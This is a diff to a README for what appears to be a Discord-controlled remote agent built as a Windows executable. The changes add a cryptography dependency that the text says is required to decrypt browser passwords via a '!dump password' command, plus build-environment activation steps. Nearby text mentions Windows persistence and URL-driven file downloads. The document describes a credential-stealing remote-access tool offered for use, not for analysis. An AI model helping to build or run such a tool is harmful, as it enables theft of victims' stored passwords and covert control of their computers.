@@ -87,10 +87,11 @@ Each deployed agent carries its own unique bot token so multiple agents can be o
 | `requests` | HTTP file downloads via `!upload <url>` |
 | `openai` | Report generation and autonomous planning |
 | `aiofiles` | Non-blocking file writes for reports and large message artifacts |
+| `pycryptodome` | Required for decrypting browser passwords with `!dump password` |
 
 Install runtime packages:
 ```bash
-pip install discord.py requests openai aiofiles
+pip install discord.py requests openai aiofiles pycryptodome
 ```
 
 ### Optional Windows Persistence Dependencies
@@ -259,6 +260,11 @@ Convert `agent_template.py` into a single Windows executable using [PyInstaller]
 ### 1. Create a clean Python 3.13 virtual environment (first time only)
 ```bat
 py -3.13 -m venv build_env
+# Activate the virtual environment:
+# On PowerShell:
+.\build_env\Scripts\Activate.ps1
+# On Command Prompt:
+build_env\Scripts\activate.bat
 ```
 ### 2. First-time setup: let the build script install dependencies if needed
 ```bat
